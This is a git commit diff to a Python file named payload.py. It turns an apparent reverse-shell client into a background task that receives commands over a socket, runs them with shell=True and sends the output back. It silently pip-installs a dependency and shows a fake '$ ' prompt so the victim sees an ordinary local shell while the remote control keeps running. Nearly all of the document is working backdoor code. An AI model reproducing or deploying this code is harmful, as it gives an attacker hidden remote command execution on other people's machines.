551304a3f6d907374b35f4aa3939bc974f90a4ec
Catayao56 <Catayao56@gmail.com>
2018-05-10 14:20:55 +0800

    Signed-off-by: Catayao56 <Catayao56@gmail.com>
    Multitasked payload

--- src/modules/payload.py
+++ src/modules/payload.py
@@ -2,6 +2,12 @@ import socket
 import subprocess
 import os
 import sys
+try:
+    import multitasking
+
+except:
+    os.system('pip install multitasking')
+    import multitasking
 
 s = socket.socket()
 n = '\n'
@@ -25,36 +31,57 @@ def try_connect():
         except:
             pass
 
-try_connect()
+@multitasking.task
+def main():
+    try_connect()
+    while True:
+        try:
+            #print("[i] W3 463 N0W C0NN3C73D 70 7H3 S36V36!") # Debug only
+            cmd = s.recv(100000)
+            if cmd[:2] == 'cd':
+                os.chdir(cmd[3:])
+                dir = os.getcwd()
+                s.sendall('bacod')
+    
+            elif cmd == 'kernel_info':
+                results = subprocess.Popen('cat /proc/version', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                results = results.stdout.read() + results.stderr.read()
+                try:
+                    s.sendall(results)
+    
+                except:
+                    program_restart()
+    
+            else:
+                results = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                results = results.stdout.read() + results.stderr.read()
+                try:
+                    s.sendall(n+results)
+
+                except:
+                    program_restart()
+
+        except(BrokenPipeError, OSError):
+            program_restart()
+
+        except:
+            program_restart()
+
+if sys.platform == 'nt':
+    os.system('cls')
+
+else:
+    os.system('clear')
+
 while True:
     try:
-        #print("[i] W3 463 N0W C0NN3C73D 70 7H3 S36V36!") # Debug only
-        cmd = s.recv(100000)
-        if cmd[:2] == 'cd':
-            os.chdir(cmd[3:])
-            dir = os.getcwd()
-            s.sendall('bacod')
-    
-        elif cmd == 'kernel_info':
-            results = subprocess.Popen('cat /proc/version', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            results = results.stdout.read() + results.stderr.read()
-            try:
-                s.sendall(results)
+        main()
+        front = input("$ ")
+        if sys.argv[0] in front:
+            continue
 
-            except:
-                program_restart()
-    
         else:
-            results = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            results = results.stdout.read() + results.stderr.read()
-            try:
-                s.sendall(n+results)
-
-            except:
-                program_restart()
-
-    except(BrokenPipeError, OSError):
-        program_restart()
+            os.system(front)
 
     except:
-        program_restart()
+        continue
